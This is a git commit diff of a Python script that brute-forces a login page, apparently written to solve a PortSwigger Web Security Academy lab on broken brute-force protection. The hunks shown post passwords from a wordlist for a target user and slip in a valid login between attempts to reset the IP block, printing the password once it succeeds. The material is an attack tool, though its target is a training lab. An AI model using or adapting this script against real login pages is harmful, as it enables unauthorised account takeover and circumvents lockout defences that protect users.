57248364709be6be8fc549a4078dbac0282954e5
Ayman <ayman6nossir@gmail.com>
2022-11-19 01:18:08 +0100

    adding bruteforce script

--- bypassing-broken-brute-force-protection.py
+++ bypassing-broken-brute-force-protection.py
@@ -2,18 +2,13 @@ import requests
 import sys
 import time
 
-
-#this is a solution i made for the portswigger lab below str
-#https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
-
-url="https://vulnerableapp.com/login"
+url="https://0af9008203834e85c0f6bc59002c004b.web-security-academy.net/login"
 username = "wiener"
-error = "wrong creds"
 proxies = {'http': 'http://127.0.0.1:8080'}
 
 
 try: 
-    def bruteCracking(username,url,error):
+    def bruteCracking(username,url):
         count = 0
         data_dict = "username=wiener&password=peter"
         response = requests.post(url, data=data_dict, proxies=proxies)
@@ -35,7 +30,7 @@ try:
             response = requests.post(url, data=data_dict, proxies=proxies)
             if "Incorrect password" in str(response.text):
                 pass
-            if "Congratulations" in str(response.text):
+            if "carlos" in str(response.text):
                 print("the correct password is :  " + password)
                 sys.exit()
                     
@@ -43,5 +38,6 @@ except:
     print("Some Error Occurred Please Check Your Internet Connection !!")
 
 with open("passwords.txt", "r") as passwords:
-    bruteCracking(username,url,error)
+    bruteCracking(username,url)
+
 
